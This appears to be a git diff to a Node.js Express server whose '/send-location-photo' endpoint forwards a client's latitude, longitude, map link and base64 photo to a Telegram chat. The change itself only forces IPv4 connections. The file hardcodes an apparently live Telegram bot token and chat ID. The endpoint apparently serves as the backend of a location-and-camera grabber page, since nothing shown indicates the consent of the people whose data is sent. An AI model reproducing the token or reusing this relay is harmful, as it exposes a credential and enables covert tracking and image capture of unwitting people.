@@ -3,15 +3,24 @@ const cors = require("cors");
 const bodyParser = require("body-parser");
 const axios = require("axios");
 const FormData = require("form-data");
+const dns = require("dns");
+const https = require("https");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(cors());
-app.use(bodyParser.json({ limit: "10mb" })); // Aumenta limite para imagens em base64
+app.use(bodyParser.json({ limit: "10mb" }));
 
-const TELEGRAM_BOT_TOKEN = "7674928346:AAEd6FNCSB_ozfmqs7islmmEaH6x8bWivVQ"; // Seu token
-const TELEGRAM_CHAT_ID = "1276935257"; // Seu chat ID
+const TELEGRAM_BOT_TOKEN = "7674928346:AAEd6FNCSB_ozfmqs7islmmEaH6x8bWivVQ";
+const TELEGRAM_CHAT_ID = "1276935257";
+
+// Força DNS para resolver com IPv4
+dns.setDefaultResultOrder("ipv4first");
+
+const httpsAgent = new https.Agent({
+  family: 4 // Força IPv4
+});
 
 app.post("/send-location-photo", async (req, res) => {
   const { latitude, longitude, maps, photo } = req.body;
@@ -26,9 +35,9 @@ app.post("/send-location-photo", async (req, res) => {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: message,
-    });
+    }, { httpsAgent });
 
-    // Envia foto, se existir
+    // Envia a foto, se existir
     if (photo) {
       const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
       const buffer = Buffer.from(base64Data, "base64");
@@ -42,6 +51,7 @@ app.post("/send-location-photo", async (req, res) => {
 
       await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, form, {
         headers: form.getHeaders(),
+        httpsAgent
       });
     }
 
